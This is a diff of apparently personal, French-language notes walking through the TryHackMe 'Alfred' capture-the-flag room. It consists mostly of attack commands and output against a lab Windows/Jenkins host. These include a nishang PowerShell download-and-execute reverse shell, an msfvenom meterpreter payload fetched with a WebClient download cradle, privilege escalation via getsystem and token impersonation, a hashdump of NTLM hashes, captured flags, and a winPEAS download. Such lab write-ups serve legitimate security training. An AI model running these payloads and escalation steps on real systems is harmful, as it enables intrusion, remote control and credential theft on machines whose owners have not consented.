@@ -5,10 +5,6 @@
 https://tryhackme.com/room/alfred
 
 
-
-export IP=10.10.232.32
-
-
 Serveur Web UP : http://10.10.232.32
 
 ```
@@ -16,15 +12,19 @@ RIP Bruce Wayne
 Donations to alfred@wayneenterprises.com are greatly appreciated. 
 ```
 
+## nmap
+
+```
 PORT     STATE SERVICE            REASON  VERSION
 80/tcp   open  http               syn-ack Microsoft IIS httpd 7.5
 3389/tcp open  ssl/ms-wbt-server? syn-ack
 8080/tcp open  http               syn-ack Jetty 9.4.z-SNAPSHOT
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
+```
 
 ## MetaSploit => FAILED
 
+```
 auxiliary/scanner/http/jenkins_command 
 
 set RHOSTS 10.10.232.32
@@ -32,7 +32,7 @@ set LHOST 10.9.28.128
 
 exploit/multi/http/jenkins_metaprogramming => FAILED
 exploit/linux/misc/jenkins_java_deserialize => FAILED
-
+```
 
 ## Brute force login : EAYSY 
 
@@ -51,31 +51,40 @@ Tips: use nishang to get a reverse shell
 
 https://github.com/samratashok/nishang
 
+```
 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
-
+```
 
 ```ps1
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.28.128/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.28.128 -Port 9001
 ```
 
+```
 PS C:\Users\bruce\Desktop> type user.txt   
 79007a09481963edf2e1321abd9ae2a0
-
+```
 
 ## cmd to meterpreter
 
+```
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.28.128 LPORT=9002 -f exe -o meter.exe
+```
 
+```
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.28.128/meter.exe','meter.exe')"
+```
 
-
+```
 use exploit/multi/handler 
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 10.9.28.128
 set LPORT 9002
 run
+```
 
+```
 Start-Process "meter.exe"
+```
 
 ```sh
 [*] Started reverse TCP handler on 10.9.28.128:9002 
@@ -89,7 +98,7 @@ Server username: alfred\bruce
 
 -a---          5/3/2020   9:02 AM      73802 meter.exe  
 
-
+```
 meterpreter > getsystem
 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
 meterpreter > getuid
@@ -103,9 +112,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 bruce:1000:aad3b435b51404eeaad3b435b51404ee:3ea0013c7eb26d63606673c34322b4ae:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 meterpreter > 
-
-
-
+```
 
 
 ```ps1
@@ -141,6 +148,7 @@ SeTimeZonePrivilege             Change the time zone                      Disabl
 SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
 ```
 
+```
 meterpreter > use incognito
 meterpreter > list_tokens -g
 [-] Warning: Not currently running as SYSTEM, not all tokens will be available
@@ -206,15 +214,22 @@ NT SERVICE\W32Time
 NT SERVICE\WdiServiceHost
 NT SERVICE\WinHttpAutoProxySvc
 NT SERVICE\wscsvc
+```
 
+```
 meterpreter > impersonate_token BUILTIN\\Administrators
 [-] Warning: Not currently running as SYSTEM, not all tokens will be available
              Call rev2self if primary process token is SYSTEM
 [+] Delegation token available
 [+] Successfully impersonated user NT AUTHORITY\SYSTEM
+```
 
+```
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
+```
+
+```
 meterpreter > ps 
 
 Process List
@@ -258,26 +273,23 @@ Process List
  2944  1540  meter.exe             x86   0        alfred\bruce                  C:\Users\bruce\meter.exe
  2964  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
  3000  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+```
 
+```
 meterpreter > migrate 668
 [*] Migrating from 2944 to 668...
 [*] Migration completed successfully.
+```
 
+```
 meterpreter > cat C:/Windows/System32/config/root.txt
-��dff0f748678f280250f25a45b8046b4a
+dff0f748678f280250f25a45b8046b4a
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
+```
 cp /home/kali/thm/steelmountain/winPEAS.bat .
+```
 
+```
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.28.128/winPEAS.bat','winPEAS.bat')"
+```
